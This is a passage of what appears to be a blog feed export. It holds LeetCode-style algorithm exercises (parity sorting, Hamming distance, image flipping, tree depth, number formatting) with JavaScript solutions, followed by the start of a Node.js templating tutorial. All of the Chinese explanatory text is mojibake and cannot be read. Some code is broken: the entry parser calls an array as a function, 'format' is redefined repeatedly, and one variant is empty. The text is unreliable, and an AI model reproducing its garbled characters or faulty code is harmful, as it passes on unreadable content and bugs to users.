123è¾“å…¥ï¼š[3,1,2,4]è¾“å‡ºï¼š[2,4,3,1]è¾“å‡º [4,2,3,1]ï¼Œ[2,4,1,3] å’Œ [4,2,1,3] ä¹Ÿä¼šè¢«æŽ¥å—ã€‚ æç¤ºï¼š 1 &lt;= A.length &lt;= 5000 0 &lt;= A[i] &lt;= 5000 è§£é¢˜æ€è·¯ï¼š éåŽ†æ•°ç»„ä¸­çš„å…ƒç´ ï¼ŒåŒæŒ‡é’ˆï¼Œå½“æŒ‡é’ˆ1ä»Žå¼€å¤´å¼€å§‹ï¼ŒæŒ‡é’ˆ2ä»Žç»“å°¾å¼€å§‹ã€‚æŒ‡é’ˆ1æ£€æµ‹åˆ°å…ƒç´ å¯¹2å–ä½™çš„æ—¶å€™ç­‰äºŽ0ï¼Œè·³å‡ºå¾ªçŽ¯ï¼›æŽ¥ç€æŒ‡é’ˆ2æ£€æµ‹åˆ°å…ƒç´ å¯¹2å–ä½™æ—¶ç­‰äºŽ1ï¼Œè·³å‡ºå¾ªçŽ¯ï¼Œäº¤æ¢ä¸¤ä¸ªæŒ‡é’ˆä¸Šé¢çš„å€¼ã€‚æŒ‡é’ˆ1ç»§ç»­å‘å³ï¼ˆ+1ï¼‰ï¼ŒæŒ‡é’ˆ2ç»§ç»­å‘å·¦ï¼ˆ-1ï¼‰æœå¯»ã€‚ 12345678910111213141516171819202122232425262728293031323334353637/** * @param &#123;number[]&#125; A * @return &#123;number[]&#125; */ const numberArray = [1,2,3,4]; var sortArrayByParity = function(A)&#123; const len = A.length; if(len === 1) return A; let i = 0; let j = len-1; while (i &lt; j) &#123; if(A[i] % 2 === 0)&#123; i++; continue; &#125; if(A[j] % 2 === 1)&#123; j--; continue; &#125; let temp = A[i]; A[i] = A[j]; A[j] = temp; i++; j-- &#125; // return A.sort(function(x)&#123; // if(x % 2 === 1) return 1; // &#125;); // const result = []; // A.map(v=&gt;&#123; // return v%2?result.push(v):result.unshift(v); // &#125;); // return result; return A; &#125;console.log(sortArrayByParity(numberArray)); æŒ‰å¥‡å¶æŽ’åºæ•°ç»„2ç»™å®šä¸€ä¸ªéžè´Ÿæ•´æ•°æ•°ç»„ Aï¼Œ A ä¸­ä¸€åŠæ•´æ•°æ˜¯å¥‡æ•°ï¼Œä¸€åŠæ•´æ•°æ˜¯å¶æ•°ã€‚ å¯¹æ•°ç»„è¿›è¡ŒæŽ’åºï¼Œä»¥ä¾¿å½“ A[i] ä¸ºå¥‡æ•°æ—¶ï¼Œi ä¹Ÿæ˜¯å¥‡æ•°ï¼›å½“ A[i] ä¸ºå¶æ•°æ—¶ï¼Œ i ä¹Ÿæ˜¯å¶æ•°ã€‚ ä½ å¯ä»¥è¿”å›žä»»ä½•æ»¡è¶³ä¸Šè¿°æ¡ä»¶çš„æ•°ç»„ä½œä¸ºç­”æ¡ˆã€‚ ç¤ºä¾‹ï¼š 123è¾“å…¥ï¼š[4,2,5,7]è¾“å‡ºï¼š[4,5,2,7]è§£é‡Šï¼š[4,7,2,5]ï¼Œ[2,5,4,7]ï¼Œ[2,7,4,5] ä¹Ÿä¼šè¢«æŽ¥å—ã€‚ æç¤ºï¼š 2 &lt;= A.length &lt;= 20000 A.length % 2 == 0 0 &lt;= A[i] &lt;= 1000 è§£é¢˜æ€è·¯ï¼š A[i] ä¸ºå¥‡æ•°æ—¶ï¼Œi ä¹Ÿæ˜¯å¥‡æ•°ï¼›å½“ A[i] ä¸ºå¶æ•°æ—¶ï¼Œ i ä¹Ÿæ˜¯å¶æ•°ã€‚è®¾å®šä¸€ä¸ªå˜é‡jä¸º1ï¼ŒA[j]ä¸ºå¥‡æ•°ï¼Œiè®¾ä¸º0ï¼Œä»Ž0,2,4è¿™æ ·çš„é—´éš”å¼€å§‹éåŽ†ï¼Œå½“ A[i]ä¸Šçš„å…ƒç´ ä¸ºå¥‡æ•°æ—¶ï¼Œæ£€æµ‹A[j]ä¸Šé¢çš„æ•°æ˜¯å¦ä¸ºå¥‡æ•°ï¼Œå¦‚æžœæ˜¯çš„è¯å°±+2æ£€æŸ¥ä¸‹ä¸€é¡¹ï¼Œå¦‚æžœä¸æ˜¯å¥‡æ•°ï¼Œå°±äº¤æ¢i,jä½ç½®ã€‚ 1234567891011121314151617181920const array = [5,7,10,2];/** * @param &#123;number[]&#125; A * @return &#123;number[]&#125;*/var sortArrayByParity2 = function(A)&#123; let j = 1; for(let i = 0; i &lt; A.length-1; i = i+2)&#123; if(A[i] % 2 === 1)&#123; while(A[j] % 2 === 1)&#123; j = j + 2; &#125; let temp = A[i]; A[i] = A[j]; A[j] = temp; &#125; &#125; return A;&#125;sortArrayByParity2(array); æœºå™¨äººèƒ½å¦è¿”å›žåŽŸç‚¹åœ¨äºŒç»´å¹³é¢ä¸Šï¼Œæœ‰ä¸€ä¸ªæœºå™¨äººä»ŽåŽŸç‚¹ (0, 0) å¼€å§‹ã€‚ç»™å‡ºå®ƒçš„ç§»åŠ¨é¡ºåºï¼Œåˆ¤æ–­è¿™ä¸ªæœºå™¨äººåœ¨å®Œæˆç§»åŠ¨åŽæ˜¯å¦åœ¨ (0, 0) å¤„ç»“æŸã€‚ ç§»åŠ¨é¡ºåºç”±å­—ç¬¦ä¸²è¡¨ç¤ºã€‚å­—ç¬¦ move[i] è¡¨ç¤ºå…¶ç¬¬ i æ¬¡ç§»åŠ¨ã€‚æœºå™¨äººçš„æœ‰æ•ˆåŠ¨ä½œæœ‰ Rï¼ˆå³ï¼‰ï¼ŒLï¼ˆå·¦ï¼‰ï¼ŒUï¼ˆä¸Šï¼‰å’Œ Dï¼ˆä¸‹ï¼‰ã€‚å¦‚æžœæœºå™¨äººåœ¨å®Œæˆæ‰€æœ‰åŠ¨ä½œåŽè¿”å›žåŽŸç‚¹ï¼Œåˆ™è¿”å›ž trueã€‚å¦åˆ™ï¼Œè¿”å›ž falseã€‚ æ³¨æ„ï¼šæœºå™¨äººâ€œé¢æœâ€çš„æ–¹å‘æ— å…³ç´§è¦ã€‚ â€œRâ€ å°†å§‹ç»ˆä½¿æœºå™¨äººå‘å³ç§»åŠ¨ä¸€æ¬¡ï¼Œâ€œLâ€ å°†å§‹ç»ˆå‘å·¦ç§»åŠ¨ç­‰ã€‚æ­¤å¤–ï¼Œå‡è®¾æ¯æ¬¡ç§»åŠ¨æœºå™¨äººçš„ç§»åŠ¨å¹…åº¦ç›¸åŒã€‚ ç¤ºä¾‹ 1: 12è¾“å…¥: &quot;UD&quot;è¾“å‡º: true è§£é‡Šï¼šæœºå™¨äººå‘ä¸Šç§»åŠ¨ä¸€æ¬¡ï¼Œç„¶åŽå‘ä¸‹ç§»åŠ¨ä¸€æ¬¡ã€‚æ‰€æœ‰åŠ¨ä½œéƒ½å…·æœ‰ç›¸åŒçš„å¹…åº¦ï¼Œå› æ­¤å®ƒæœ€ç»ˆå›žåˆ°å®ƒå¼€å§‹çš„åŽŸç‚¹ã€‚å› æ­¤ï¼Œæˆ‘ä»¬è¿”å›ž trueã€‚ç¤ºä¾‹ 2: 12è¾“å…¥: &quot;LL&quot;è¾“å‡º: false è§£é‡Šï¼šæœºå™¨äººå‘å·¦ç§»åŠ¨ä¸¤æ¬¡ã€‚å®ƒæœ€ç»ˆä½äºŽåŽŸç‚¹çš„å·¦ä¾§ï¼Œè·åŽŸç‚¹æœ‰ä¸¤æ¬¡ â€œç§»åŠ¨â€ çš„è·ç¦»ã€‚æˆ‘ä»¬è¿”å›ž falseï¼Œå› ä¸ºå®ƒåœ¨ç§»åŠ¨ç»“æŸæ—¶æ²¡æœ‰è¿”å›žåŽŸç‚¹ã€‚ è§£é¢˜æ€è·¯ï¼š è®¾å®šx,yåæ ‡ï¼ŒéåŽ†å­—ç¬¦ä¸²ï¼Œæ ¹æ®ä¸åŒçš„å­—ç¬¦ä¸²æ¥ç§»åŠ¨x,yçš„è·ç¦»ã€‚æœ€åŽåˆ¤æ–­x,yæ˜¯å¦ç­‰äºŽåˆå§‹å€¼æ¥åˆ¤æ–­æ˜¯å¦åœ¨åŽŸåœ°ã€‚ 123456789101112131415161718192021222324252627/** *@params &#123;string&#125; moves *@return &#123;boolean&#125; */ var judgeCircle = function(moves)&#123; let x=0,y=0,moveArr = moves.split(''); moveArr.map(i =&gt;&#123; switch(i) &#123; case 'R': x++ break; case 'L': x--; break; case 'U': y++ break; case 'D': y--; break; default: break; &#125; &#125;) return x === 0 &amp;&amp; y === 0; &#125; console.log(judgeCircle('UD')); æ±‰æ˜Žè·ç¦»ä¸¤ä¸ªæ•´æ•°ä¹‹é—´çš„æ±‰æ˜Žè·ç¦»æŒ‡çš„æ˜¯è¿™ä¸¤ä¸ªæ•°å­—å¯¹åº”äºŒè¿›åˆ¶ä½ä¸åŒçš„ä½ç½®çš„æ•°ç›®ã€‚ ç»™å‡ºä¸¤ä¸ªæ•´æ•° x å’Œ yï¼Œè®¡ç®—å®ƒä»¬ä¹‹é—´çš„æ±‰æ˜Žè·ç¦»ã€‚ æ³¨æ„ï¼š0 â‰¤ x, y &lt; 231. ç¤ºä¾‹: 12è¾“å…¥: x = 1, y = 4è¾“å‡º: 2 è§£é‡Š: 1231 (0 0 0 1)4 (0 1 0 0) â†‘ â†‘ ä¸Šé¢çš„ç®­å¤´æŒ‡å‡ºäº†å¯¹åº”äºŒè¿›åˆ¶ä½ä¸åŒçš„ä½ç½®ã€‚ è§£é¢˜æ€è·¯ï¼š å¼‚æˆ–ï¼ˆ^ï¼‰:ä½ä¸ç›¸ç­‰æ—¶å–1ï¼Œå¦åˆ™å–é›¶ 123451 (0 0 0 1)^4 (0 1 0 0)----------------- (0 1 0 1) 123456789/** * @param &#123;number&#125; x * @param &#123;number&#125; y * @return &#123;number&#125; */ var hammingDistance = function(x, y) &#123; return (x^y).toString(2).replace(/0/g,'').length; &#125;; hammingDistance(1,4); ç¿»è½¬å›¾åƒç»™å®šä¸€ä¸ªäºŒè¿›åˆ¶çŸ©é˜µ Aï¼Œæˆ‘ä»¬æƒ³å…ˆæ°´å¹³ç¿»è½¬å›¾åƒï¼Œç„¶åŽåè½¬å›¾åƒå¹¶è¿”å›žç»“æžœã€‚ æ°´å¹³ç¿»è½¬å›¾ç‰‡å°±æ˜¯å°†å›¾ç‰‡çš„æ¯ä¸€è¡Œéƒ½è¿›è¡Œç¿»è½¬ï¼Œå³é€†åºã€‚ä¾‹å¦‚ï¼Œæ°´å¹³ç¿»è½¬ [1, 1, 0] çš„ç»“æžœæ˜¯ [0, 1, 1]ã€‚ åè½¬å›¾ç‰‡çš„æ„æ€æ˜¯å›¾ç‰‡ä¸­çš„ 0 å…¨éƒ¨è¢« 1 æ›¿æ¢ï¼Œ 1 å…¨éƒ¨è¢« 0 æ›¿æ¢ã€‚ä¾‹å¦‚ï¼Œåè½¬ [0, 1, 1] çš„ç»“æžœæ˜¯ [1, 0, 0]ã€‚ ç¤ºä¾‹ 1: 12è¾“å…¥: [[1,1,0],[1,0,1],[0,0,0]]è¾“å‡º: [[1,0,0],[0,1,0],[1,1,1]] è§£é‡Š: é¦–å…ˆç¿»è½¬æ¯ä¸€è¡Œ: [[0,1,1],[1,0,1],[0,0,0]]ï¼›â€‹ ç„¶åŽåè½¬å›¾ç‰‡: [[1,0,0],[0,1,0],[1,1,1]]ç¤ºä¾‹ 2: 12è¾“å…¥: [[1,1,0,0],[1,0,0,1],[0,1,1,1],[1,0,1,0]]è¾“å‡º: [[1,1,0,0],[0,1,1,0],[0,0,0,1],[1,0,1,0]] è§£é‡Š: é¦–å…ˆç¿»è½¬æ¯ä¸€è¡Œ: [[0,0,1,1],[1,0,0,1],[1,1,1,0],[0,1,0,1]]ï¼›â€‹ ç„¶åŽåè½¬å›¾ç‰‡: [[1,1,0,0],[0,1,1,0],[0,0,0,1],[1,0,1,0]]è¯´æ˜Ž: 1 &lt;= A.length = A[0].length &lt;= 20 0 &lt;= A[i][j] &lt;= 1 è§£é¢˜æ€è·¯ï¼š ~1çš„è®¡ç®—æ­¥éª¤ï¼š å°†1(è¿™é‡Œå«ï¼šåŽŸç )è½¬äºŒè¿›åˆ¶ ï¼ 00000001 æŒ‰ä½å–å ï¼ 11111110 å‘çŽ°ç¬¦å·ä½(å³æœ€é«˜ä½)ä¸º1(è¡¨ç¤ºè´Ÿæ•°)ï¼Œå°†é™¤ç¬¦å·ä½ä¹‹å¤–çš„å…¶ä»–æ•°å­—å–å ï¼ 10000001 æœ«ä½åŠ 1å–å…¶è¡¥ç  ï¼ 10000010 è½¬æ¢å›žåè¿›åˆ¶ ï¼ -2 123456789/** * @param &#123;number[][]&#125; A * return &#123;number[][]&#125; */ const img = [[1,1,0],[1,0,1],[0,0,0]]; var flipAndInvertImage = function(A)&#123; return A.map(v=&gt; v.map( i =&gt; ~i + 2).reverse()) &#125; flipAndInvertImage(img); å¢žå‡å­—ç¬¦ä¸²åŒ¹é…ç»™å®šåªå« â€œIâ€ï¼ˆå¢žå¤§ï¼‰æˆ– â€œDâ€ï¼ˆå‡å°ï¼‰çš„å­—ç¬¦ä¸² S ï¼Œä»¤ N = S.lengthã€‚ è¿”å›ž [0, 1, â€¦, N] çš„ä»»æ„æŽ’åˆ— A ä½¿å¾—å¯¹äºŽæ‰€æœ‰ i = 0, â€¦, N-1ï¼Œéƒ½æœ‰ï¼š å¦‚æžœ S[i] == â€œIâ€ï¼Œé‚£ä¹ˆ A[i] &lt; A[i+1]å¦‚æžœ S[i] == â€œDâ€ï¼Œé‚£ä¹ˆ A[i] &gt; A[i+1] ç¤ºä¾‹ 1ï¼š 12è¾“å‡ºï¼š&quot;IDID&quot;è¾“å‡ºï¼š[0,4,1,3,2] ç¤ºä¾‹ 2ï¼š 12è¾“å‡ºï¼š&quot;III&quot;è¾“å‡ºï¼š[0,1,2,3] ç¤ºä¾‹ 3ï¼š 12è¾“å‡ºï¼š&quot;DDI&quot;è¾“å‡ºï¼š[3,2,0,1] æç¤ºï¼š 1 &lt;= S.length &lt;= 1000S åªåŒ…å«å­—ç¬¦ â€œIâ€ æˆ– â€œDâ€ã€‚ è§£é¢˜æ€è·¯: å¯¹ é•¿åº¦ä¸ºNçš„ä»Ž0å¼€å§‹é¡ºåºæŽ’åºçš„æ•°ç»„æ ¹æ® â€˜Iâ€™,â€™Dâ€™è¿›è¡ŒæŽ’åºã€‚ 1234567891011121314151617181920/** * @param &#123;string&#125; S * @return &#123;number[]&#125; */ const str = 'IDID'; var diStringMatch = function(S)&#123; S += "I" let stArr = S.split(''); let Arr = [...new Array(S.length)].map((v,i) =&gt; i); let result = []; stArr.map(v =&gt;&#123; if(v === 'I')&#123; result.push(Arr.shift()); &#125;else&#123; result.push(Arr.pop()); &#125; &#125;) return result; &#125; diStringMatch(str); å±±è„‰æ•°ç»„çš„å³°é¡¶ç´¢å¼•æˆ‘ä»¬æŠŠç¬¦åˆä¸‹åˆ—å±žæ€§çš„æ•°ç»„ A ç§°ä½œå±±è„‰ï¼š A.length &gt;= 3å­˜åœ¨ 0 &lt; i &lt; A.length - 1 ä½¿å¾—A[0] &lt; A[1] &lt; â€¦ A[i-1] &lt; A[i] &gt; A[i+1] &gt; â€¦ &gt; A[A.length - 1]ç»™å®šä¸€ä¸ªç¡®å®šä¸ºå±±è„‰çš„æ•°ç»„ï¼Œè¿”å›žä»»ä½•æ»¡è¶³ A[0] &lt; A[1] &lt; â€¦ A[i-1] &lt; A[i] &gt; A[i+1] &gt; â€¦ &gt; A[A.length - 1] çš„ i çš„å€¼ã€‚ ç¤ºä¾‹ 1ï¼š 12è¾“å…¥ï¼š[0,1,0]è¾“å‡ºï¼š1 ç¤ºä¾‹ 2ï¼š 12è¾“å…¥ï¼š[0,2,1,0]è¾“å‡ºï¼š1 æç¤ºï¼š 3 &lt;= A.length &lt;= 100000 &lt;= A[i] &lt;= 10^6A æ˜¯å¦‚ä¸Šå®šä¹‰çš„å±±è„‰ è§£é¢˜æ€è·¯ï¼š ç”±äºŽå·²çŸ¥æ•°ç»„ä¸€å®šæ˜¯å±±è„‰æ•°ç»„ï¼Œæ‰€ä»¥å¯ä»¥ç†è§£ä¸ºæ±‚æ•°ç»„ä¸­çš„æœ€å¤§æ•°ï¼Ÿ 12345678910111213141516/** * @param &#123;number[]&#125; A * @return &#123;number&#125; */ const arr = [0,1,2,3,2,1,0]; var peakIndexInMoutainArray = function(A)&#123; let max = A[0],index; for(let i =0; i &lt; A.length; i++)&#123; if(A[i]&gt;max)&#123; max = A[i] index=i; &#125; &#125; return index; &#125; peakIndexInMoutainArray(arr); äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦ç»™å®šä¸€ä¸ªäºŒå‰æ ‘ï¼Œæ‰¾å‡ºå…¶æœ€å¤§æ·±åº¦ã€‚ äºŒå‰æ ‘çš„æ·±åº¦ä¸ºæ ¹èŠ‚ç‚¹åˆ°æœ€è¿œå¶å­èŠ‚ç‚¹çš„æœ€é•¿è·¯å¾„ä¸Šçš„èŠ‚ç‚¹æ•°ã€‚ è¯´æ˜Ž: å¶å­èŠ‚ç‚¹æ˜¯æŒ‡æ²¡æœ‰å­èŠ‚ç‚¹çš„èŠ‚ç‚¹ã€‚ ç¤ºä¾‹ï¼šç»™å®šäºŒå‰æ ‘ [3,9,20,null,null,15,7]ï¼Œ 3 / \ 9 20 / \ 15 7 è¿”å›žå®ƒçš„æœ€å¤§æ·±åº¦ 3 è§£é¢˜æ€è·¯ï¼š é€’å½’ 1234567891011121314151617/** * Definition for a binary tree node. * function TreeNode(val) &#123; * this.val = val; * this.left = this.right = null; * &#125; *//** * @param &#123;TreeNode&#125; root * @return &#123;number&#125; */ var maxDepth = function(root)&#123; if(root === null)&#123; return 0; &#125; return Math.max(arguments.callee(root.left),arguments.callee(root.right))+1; &#125; æ•°å­—çš„è¡¥æ•°ç»™å®šä¸€ä¸ªæ­£æ•´æ•°ï¼Œè¾“å‡ºå®ƒçš„è¡¥æ•°ã€‚è¡¥æ•°æ˜¯å¯¹è¯¥æ•°çš„äºŒè¿›åˆ¶è¡¨ç¤ºå–åã€‚ æ³¨æ„: ç»™å®šçš„æ•´æ•°ä¿è¯åœ¨32ä½å¸¦ç¬¦å·æ•´æ•°çš„èŒƒå›´å†…ã€‚ä½ å¯ä»¥å‡å®šäºŒè¿›åˆ¶æ•°ä¸åŒ…å«å‰å¯¼é›¶ä½ã€‚ç¤ºä¾‹ 1: 12è¾“å…¥: 5è¾“å‡º: 2 è§£é‡Š: 5çš„äºŒè¿›åˆ¶è¡¨ç¤ºä¸º101ï¼ˆæ²¡æœ‰å‰å¯¼é›¶ä½ï¼‰ï¼Œå…¶è¡¥æ•°ä¸º010ã€‚æ‰€ä»¥ä½ éœ€è¦è¾“å‡º2ã€‚ç¤ºä¾‹ 2: 12è¾“å…¥: 1è¾“å‡º: 0 è§£é‡Š: 1çš„äºŒè¿›åˆ¶è¡¨ç¤ºä¸º1ï¼ˆæ²¡æœ‰å‰å¯¼é›¶ä½ï¼‰ï¼Œå…¶è¡¥æ•°ä¸º0ã€‚æ‰€ä»¥ä½ éœ€è¦è¾“å‡º0ã€‚ è§£é¢˜æ€è·¯ï¼š å¼‚æˆ–ï¼ˆ^ï¼‰:ä½ä¸ç›¸ç­‰æ—¶å–1ï¼Œå¦åˆ™å–é›¶ 123456789/** * @param &#123;number&#125; num * @return &#123;number&#125; */const num = 5;var findComplement = function(num)&#123; return parseInt(num.toString(2).split('').map(v=&gt; 1^v ).join(''),2);&#125;findComplement(num); æ•°å€¼åƒåˆ†ä½æ ¼å¼åŒ–å‡ ä¸ªå¸¸è§çš„æˆªå–å­—ç¬¦å‡½æ•° substrè¯­æ³•ï¼š 1stringObject.substr(start,length) å‚æ•° æè¿° start å¿…éœ€ã€‚è¦æŠ½å–çš„å­ä¸²çš„èµ·å§‹ä¸‹æ ‡ã€‚å¿…éœ€æ˜¯æ•°å€¼ï¼Œå¦‚æžœæ˜¯è´Ÿæ•°ï¼Œé‚£ä¹ˆæ”¹å‚æ•°å£°æ˜Žä»Žå­—ç¬¦ä¸²çš„å°¾éƒ¨å¼€å§‹ç®—èµ·çš„ä½ç½®ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ-1 æŒ‡å­—ç¬¦ä¸²ä¸­æœ€åŽä¸€ä¸ªå­—ç¬¦ï¼Œ-2æŒ‡å€’æ•°ç¬¬äºŒä¸ªå­—ç¬¦ length å¯é€‰ï¼Œå­ä¸²ä¸­å­—ç¬¦æ•°ï¼Œå¿…é¡»æ˜¯æ•°å€¼ã€‚å¦‚æžœçœç•¥äº†è¯¥å‚æ•°ï¼Œé‚£ä¹ˆè¿”å›žä»Ž stringobject çš„å¼€å§‹ä½ç½®åˆ°ç»“å°¾çš„å­ä¸² substringè¯­æ³•ï¼š 1stringObject.substring(start,stop) å‚æ•° æè¿° start å¿…éœ€ã€‚ä¸€ä¸ªéžè´Ÿçš„æ•´æ•°ï¼Œè§„å®šè¦æå–çš„å­ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦åœ¨ stringObject ä¸­çš„ä½ç½® stop å¯é€‰ã€‚ä¸€ä¸ªéžè´Ÿçš„æ•´æ•°ï¼Œæ¯”è¦æå–çš„å­ä¸²çš„æœ€åŽä¸€ä¸ªå­—ç¬¦åœ¨ stringObject ä¸­çš„ä½ç½®å¤š1.å¦‚æžœå¿½ç•¥è¯¥å‚æ•°ï¼Œé‚£ä¹ˆè¿”å›žçš„å­ä¸²ä¼šä¸€ç›´åˆ°å­—ç¬¦ä¸²çš„ç»“å°¾ è¿”å›ž ä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ï¼Œè¯¥å­—ç¬¦ä¸²å€¼åŒ…å« stringObject çš„ä¸€ä¸ªå­å­—ç¬¦ä¸²ï¼Œå†…å®¹æ˜¯ä»Ž start åˆ° stop-1 çš„æ‰€æœ‰å­—ç¬¦ï¼Œå…¶é•¿åº¦ä¸º stop å‡ start sliceè¯­æ³•ï¼š 1stringObject.slice(start,end) å‚æ•° æè¿° start è¦æŠ½å–çš„ç‰‡æ–­çš„èµ·å§‹ä¸‹æ ‡ã€‚å¦‚æžœæ˜¯è´Ÿæ•°ï¼Œåˆ™è¯¥å‚æ•°è§„å®šæ˜¯ä»Žå­—ç¬¦ä¸²çš„å°¾éƒ¨å¼€å§‹ç®—èµ·çš„ä½ç½®ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ-1æŒ‡å­—ç¬¦ä¸²çš„æœ€åŽä¸€ä¸ªå­—ç¬¦ï¼Œ-2æŒ‡å€’æ•°ç¬¬äºŒä¸ªå­—ç¬¦ï¼Œä»¥æ­¤ç±»æŽ¨ end ç´§æŽ¥ç€è¦æŠ½å–çš„ç‰‡æ®µçš„ç»“å°¾çš„ä¸‹æ ‡ã€‚è‹¥æœªæŒ‡å®šè¯¥å‚æ•°ï¼Œåˆ™è¦æå–çš„å­ä¸²åŒ…æ‹¬ start åˆ°åŽŸå­—ç¬¦ä¸²ç»“å°¾çš„å­—ç¬¦ä¸²ã€‚å¦‚æžœè¯¥å‚æ•°æ˜¯è´Ÿæ•°ï¼Œé‚£ä¹ˆå®ƒè§„å®šçš„æ˜¯ä»Žå­—ç¬¦ä¸²çš„å°¾éƒ¨å¼€å§‹ç®—èµ·çš„ä½ç½® return ä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ï¼ŒåŒ…æ‹¬å­—ç¬¦ä¸²ä»Ž start å¼€å§‹ä»Ž end ï¼ˆä¸åŒ…æ‹¬endï¼‰ç»“æŸä¸ºæ­¢çš„æ‰€æœ‰å­—ç¬¦ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647const n = 12345678910;// æ–¹æ³•1function format(n)&#123; const result = []; const str = n.toString(); const len = str.length; for(let i=1;i&lt;=len/3;i++)&#123; result.unshift(str.substr(len-i*3,3)); if(len-i*3&lt;3)&#123; result.unshift(str.substr(0,len-i*3)) &#125; &#125; return result.join(',');&#125;// æ–¹æ³•2function format(n)&#123; let resultStr = ''; const str = n.toString(); const len = str.length; let j=0; for(let i=len-1;i&gt;=0;i--)&#123; j++; resultStr=str.charAt(i)+resultStr if(!(j%3) &amp;&amp; i!=0)&#123; resultStr=','+resultStr &#125; &#125; return resultStr;&#125;// æ–¹æ³•3function format(n)&#123; const result = []; const str = n.toString(); const len = str.length; for(let i=0;i&lt;len/3;i++)&#123; result.unshift(str.substring(len-(i+1)*3,len-i*3)) &#125; return result.join(',');&#125;// æ–¹æ³•4function format()&#123; &#125;// æ–¹æ³•5function format(n)&#123; return (n.toFixed(2) + '').replace(/\d&#123;1,3&#125;(?=(\d&#123;3&#125;)+(\.\d*)?$)/g,'$&amp;,')&#125;]]></content>
      <categories>
        <category>å‰ç«¯é¢è¯•</category>
      </categories>
      <tags>
        <tag>å‰ç«¯é¢è¯•é¢˜</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nodejså®žæˆ˜ â€”â€” Web ç¨‹åºçš„æ¨¡æ¿]]></title>
    <url>%2F2018-12-17-NodeJs2-Part7.html</url>
    <content type="text"><![CDATA[è¯» ã€Šnode.jså®žæˆ˜2.0ã€‹ï¼Œè¿›è¡Œå­¦ä¹ è®°å½•æ€»ç»“ã€‚ å½“å½“ç½‘è´­ä¹°é“¾æŽ¥ è±†ç“£ç½‘1.0é“¾æŽ¥ è¿™ç« ä¼šæ¶‰åŠä¸‰ä¸ªçƒ­é—¨çš„æ¨¡æ¿å¼•æ“Žï¼Œä»¥åŠå¦‚ä½•ç”¨æ¨¡æ¿æŠŠæ˜¾ç¤ºå±‚æ ‡è®°ä»Žé€»è¾‘ä»£ç ä¸­åˆ†ç¦»å‡ºæ¥ï¼Œä¿æŒ Web ç¨‹åºä»£ç çš„æ•´æ´æ€§ã€‚ Web ç¨‹åºçš„æ¨¡æ¿ç”¨æ¨¡æ¿ä¿æŒä»£ç çš„æ•´æ´æ€§åœ¨ Node ä¸­ å¯ä»¥åƒå…¶ä»– Web æŠ€æœ¯ä¸€æ ·ï¼Œç”¨ MVC æ¨¡å¼å¼€å‘ä¼ ç»Ÿçš„ Web ç¨‹åºã€‚ä¸»è¦çš„æ€æƒ³æ˜¯å°†é€»è¾‘ã€æ•°æ®å’Œå±•ç¤ºå±‚åˆ†ç¦»ã€‚åœ¨éµå¾ª MVC æ¨¡å¼çš„ Web ç¨‹åºä¸­ï¼Œä¸€èˆ¬æ˜¯ç”¨æˆ·å‘æœåŠ¡å™¨è¯·æ±‚èµ„æºï¼Œç„¶åŽæŽ§åˆ¶å™¨å‘æ¨¡åž‹è¯·æ±‚æ•°æ®ï¼Œå¾—åˆ°æ•°æ®åŽä¼ åˆ°è§†å›¾ï¼Œå†ç”±è§†å›¾ä»¥ç‰¹å®šæ ¼å¼å°†æ•°æ®å‘ˆçŽ°ç»™ç”¨æˆ·ã€‚MVC ä¸­çš„è§†å›¾éƒ¨åˆ†ä¸€èˆ¬ä¼šç”¨åˆ°æŸç§æ¨¡æ¿è¯­è¨€ã€‚åœ¨ä½¿ç”¨æ¨¡æ¿æ—¶ï¼Œè§†å›¾ä¼šå°†æ¨¡åž‹è¿”å›žçš„æ•°æ®ä¼ é€’ç»™æ¨¡æ¿å¼•æ“Žï¼Œå¹¶åˆ¶å®šç”¨é‚£ä¸ªæ¨¡æ¿æ–‡ä»¶å±•ç¤ºè¿™äº›æ•°æ®ã€‚ æ¨¡æ¿æ–‡ä»¶ä¸­é€šå¸¸åŒ…å«æ•°æ®çš„å ä½ç¬¦ã€HTMLã€CSSï¼Œæœ‰æ—¶è¿˜ä¼šç”¨ä¸€äº›å®¢æˆ·ç«¯ JavaScript æ¥åšç¬¬ä¸‰æ–¹å°éƒ¨åˆ†æ˜¾ç¤ºï¼Œæ¯”å¦‚ç‚¹èµžæŒ‰é’®ã€æˆ–è€…è§¦å‘ç•Œé¢è¡Œä¸ºï¼Œéšè—æ˜¾ç¤ºé¡µé¢ç­‰ç­‰æ“ä½œã€‚å› ä¸ºæ¨¡æ¿æ–‡ä»¶çš„å·¥ä½œé‡ç‚¹æ˜¯å±•ç¤ºè€Œä¸æ˜¯å¤„ç†é€»è¾‘ï¼Œæ‰€ä»¥å‰åŽç«¯äººå‘˜å¯ä»¥ä¸€èµ·å·¥ä½œï¼Œæœ‰åˆ©äºŽé¡¹ç›®ä»»åŠ¡çš„åˆ†å·¥ã€‚ æ¨¡æ¿å®žæˆ˜åšå®¢æ–‡ç« æ˜¯ä»Žæ–‡æœ¬ä¸­è¯»å–çš„ï¼Œæ ¼å¼å¦‚ä¸‹ã€‚---è¡¨æ˜Žä¸€ç¯‡æ–‡ç« ç»“æŸï¼Œå¦ä¸€ç¯‡æ–‡ç« å¼€å§‹ã€‚ 1234567title: It is someone birthday!data: January 09,2098I am getting old, but thankfully i am not in jail!---title: Movies are pretty gooddata: January 2,2078I have been watching a lot of movies lately.It is relaxing,except when they have clowns in them. åšå®¢ç¨‹åºä»£ç ï¼Œè¯»å–åšå®¢æ–‡ç«  1234567891011121314151617181920212223242526272829303132333435// index.jsconst fs = require('fs');const http = require('http');// è¯»å–å’Œè§£æžåšå®¢æ–‡ç« çš„æ•°æ®function getEntries() &#123; const entries = []; // ä»Žæ–‡ä»¶ä¸­è¯»å–åšå®¢æ–‡ç« çš„æ•°æ® let entriesRaw = fs.readFileSync('./entries.txt', 'utf8'); entriesRaw = entriesRaw.split('---'); entriesRaw(entryRaw =&gt; &#123; const entry = &#123;&#125;; const lines = entryRaw.split('\n'); lines.map(line =&gt; &#123; if (line.indexOf('title: ') === 0) &#123; entry.title = line.replace('title: ', ''); &#125; else if (line.indexOf('date: ') === 0) &#123; entry.date = line.replace('date: ', ''); &#125; else &#123; entry.body = entry.body || ''; entry.body += line; &#125; &#125;) 